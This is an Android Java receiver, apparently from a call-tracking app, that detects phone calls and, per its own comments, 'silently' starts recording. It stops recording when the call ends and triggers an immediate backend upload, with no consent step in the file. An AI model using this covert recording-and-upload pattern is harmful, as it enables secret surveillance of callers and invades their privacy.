package com.zez.app.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.zez.app.service.CallSyncWorker;
import com.zez.app.util.CallRecordManager;

public class CallStateReceiver extends BroadcastReceiver {
    private static final String TAG = "CallStateReceiver";
    private static String lastState = TelephonyManager.EXTRA_STATE_IDLE;
    private static String savedNumber = "";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;
        String action = intent.getAction();

        if (TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(action)) {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            Log.d(TAG, "ACTION_PHONE_STATE_CHANGED: state=" + state + ", number=" + number);

            if (number != null && !number.trim().isEmpty()) {
                savedNumber = number;
            }

            if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state) && !TelephonyManager.EXTRA_STATE_OFFHOOK.equals(lastState)) {
                // Cellular phone call answered/in progress - silently start recording automatically
                Log.d(TAG, "Cellular call active (OFFHOOK). Starting silent recording...");
                try {
                    String direction = TelephonyManager.EXTRA_STATE_RINGING.equals(lastState) ? "INCOMING" : "OUTGOING";
                    CallRecordManager.getInstance(context).startRecording(
                            savedNumber,
                            null,
                            "PHONE_CALL",
                            direction
                    );
                } catch (Exception e) {
                    Log.e(TAG, "Failed to auto-record cellular call: " + e.getMessage(), e);
                }
            } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state) && !TelephonyManager.EXTRA_STATE_IDLE.equals(lastState)) {
                // Call just transitioned to IDLE (call hung up, missed, or rejected)
                Log.d(TAG, "Call ended (IDLE). Stopping recording & triggering immediate backend sync...");
                try {
                    CallRecordManager.getInstance(context).stopRecording();
                } catch (Exception e) {
                    Log.e(TAG, "Error stopping recording on IDLE: " + e.getMessage(), e);
                }
                savedNumber = "";
                CallSyncWorker.syncNowAsync(context);
                CallSyncWorker.scheduleImmediateSync(context);
            }

            if (state != null) {
                lastState = state;
            }
        }
    }
}
